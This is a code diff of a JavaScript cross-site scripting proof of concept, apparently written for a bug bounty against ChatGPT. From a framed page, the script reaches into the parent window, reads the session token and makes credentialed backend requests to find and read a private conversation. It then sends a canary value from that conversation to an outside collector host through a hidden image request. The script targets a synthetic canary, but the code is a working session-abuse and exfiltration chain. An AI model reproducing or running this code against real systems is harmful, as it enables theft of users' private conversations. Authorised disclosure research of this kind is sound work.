@@ -1,7 +1,8 @@
 const statusNode = document.getElementById("status");
 
 function parentOriginProof() {
-  var doc = parent.document;
+  var host = parent;
+  var doc = host.document;
   var root = doc.documentElement;
   var stateKey = "bbPrivateChatV3";
   var exactTitle = "BB-XSS-PRIVATE-CHAT-PROOF-20261019";
@@ -29,7 +30,7 @@ function parentOriginProof() {
     try {
       var payload = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
       payload += "=".repeat((4 - (payload.length % 4)) % 4);
-      var claims = JSON.parse(parent.atob(payload));
+      var claims = JSON.parse(host.atob(payload));
       var auth = claims["https://api.openai.com/auth"] || {};
       return auth.chatgpt_account_id || auth.account_id || null;
     } catch (ignored) {
@@ -39,11 +40,11 @@ function parentOriginProof() {
 
   function getJson(url, phase, headers) {
     banner(phase);
-    var controller = new parent.AbortController();
-    var timer = parent.setTimeout(function () {
+    var controller = new host.AbortController();
+    var timer = host.setTimeout(function () {
       controller.abort();
     }, 7000);
-    return parent.fetch(new parent.URL(url, parent.location.origin).href, {
+    return host.fetch(new host.URL(url, host.location.origin).href, {
       credentials: "include",
       headers: headers,
       signal: controller.signal,
@@ -58,19 +59,18 @@ function parentOriginProof() {
       }
       return response.json();
     }).finally(function () {
-      parent.clearTimeout(timer);
+      host.clearTimeout(timer);
     });
   }
 
-  function findConversation(offset, headers) {
-    var pageNumber = offset / 20 + 1;
+  function findConversation(headers) {
     var url =
       "/backend-api/conversations?conversation_origin=&exclude_conversation_origin=tpp" +
       "&expand=false&hide_snorlax=false&is_archived=false&is_starred=false" +
-      "&limit=20&order=updated&offset=" + offset;
+      "&limit=20&order=updated&offset=0";
     return getJson(
       url,
-      "phase 2/4: locating the named synthetic conversation (page " + pageNumber + ")",
+      "phase 2/4: locating the named synthetic conversation in the latest 20",
       headers,
     ).then(function (page) {
       var items = page.items || [];
@@ -78,8 +78,7 @@ function parentOriginProof() {
         return item && item.title === exactTitle;
       });
       if (match) return match;
-      if (items.length === 20 && offset !== 80) return findConversation(offset + 20, headers);
-      throw Error("synthetic conversation not found");
+      throw Error("synthetic conversation not found in latest 20");
     });
   }
 
@@ -131,7 +130,7 @@ function parentOriginProof() {
     };
     banner("phase 1/4: authenticated context acquired");
 
-    findConversation(0, headers).then(function (conversation) {
+    findConversation(headers).then(function (conversation) {
       return readConversation(conversation.id, headers);
     }).then(function (detail) {
       var match = JSON.stringify(detail).match(/PRIVATE_CANARY:[a-f0-9]{40}/);
@@ -146,36 +145,40 @@ function parentOriginProof() {
       session = null;
       headers = null;
       root.dataset[stateKey] = "sent";
-      banner("phase 4/4: sending only the exact synthetic canary");
+      var runId = Date.now();
+      banner("phase 4/4: dispatching exact canary (run " + runId + ")");
 
       return new Promise(function (resolve, reject) {
         var image = doc.createElement("img");
-        var timer = parent.setTimeout(function () {
+        var timer = host.setTimeout(function () {
           image.remove();
-          reject(Error("collector timeout"));
+          resolve("timeout");
         }, 8000);
         image.hidden = true;
         image.referrerPolicy = "no-referrer";
         image.onload = function () {
-          parent.clearTimeout(timer);
+          host.clearTimeout(timer);
           image.remove();
-          resolve();
+          resolve("loaded");
         };
         image.onerror = function () {
-          parent.clearTimeout(timer);
+          host.clearTimeout(timer);
           image.remove();
-          reject(Error("collector request failed"));
+          resolve("blocked");
         };
         image.src = collector +
           "?source=chatgpt-private-chat-v3&canary=" + encodeURIComponent(canary) +
-          "&r=" + Date.now();
+          "&r=" + runId;
         (doc.body || root).appendChild(image);
+      }).then(function (outcome) {
+        return {outcome: outcome, runId: runId};
       });
-    }).then(function () {
-      root.dataset[stateKey] = "done";
+    }).then(function (result) {
+      root.dataset[stateKey] = "sent";
       banner(
-        "confirmed: private synthetic canary read and received by the controlled collector",
-        "#15803d",
+        "collector request dispatched (run " + result.runId + ", response " +
+          result.outcome + "); verify the controlled collector",
+        "#0369a1",
       );
     }).catch(retry);
   } catch (error) {
